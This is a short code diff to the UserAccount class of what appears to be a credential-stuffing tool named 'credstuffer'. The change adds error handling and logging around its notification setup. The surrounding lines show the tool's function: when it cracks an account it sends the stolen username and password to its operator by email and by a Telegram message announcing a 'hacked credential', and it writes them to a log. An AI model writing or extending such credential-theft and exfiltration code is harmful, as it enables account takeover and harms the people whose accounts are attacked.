@@ -38,7 +38,11 @@ class UserAccount(Account):
                     self.sender = kwargs.get('sender')
                     self.password = kwargs.get('password')
                     self.receiver = kwargs.get('receiver')
-                    self.mail = Mail(smtp_server=kwargs.get('smtp'), port=kwargs.get('port'))
+                    try:
+                        self.mail = Mail(smtp_server=kwargs.get('smtp'), port=kwargs.get('port'))
+                    except Exception as ex:
+                        self.mail = None
+                        self.logger.error("Could not create Mail instance! Error {}".format(ex))
             if 'telegram' in self.notify:
                 if token is not None:
                     self.token = token
@@ -100,8 +104,11 @@ class UserAccount(Account):
             self.mail.set_body(mail_content)
             self.logger.info("send credential mail: {}".format(mail_content))
             self.mail.send(username=self.sender, password=self.password, receiver=self.receiver)
-
+        else:
+            self.logger.error("No Mail instance was created! Could not send email")
         if self.credstuffer_telegram is not None:
             msg_content = "CREDSTUFFER has succesfully hacked credential from account {}\n\nUsername: *{}*\nPassword: *{}*"\
                            .format(self.name, username, password)
             self.credstuffer_telegram.new_msg(text=msg_content)
+        else:
+            self.logger.error("No Telegram instance was created! Could not send telegram message")
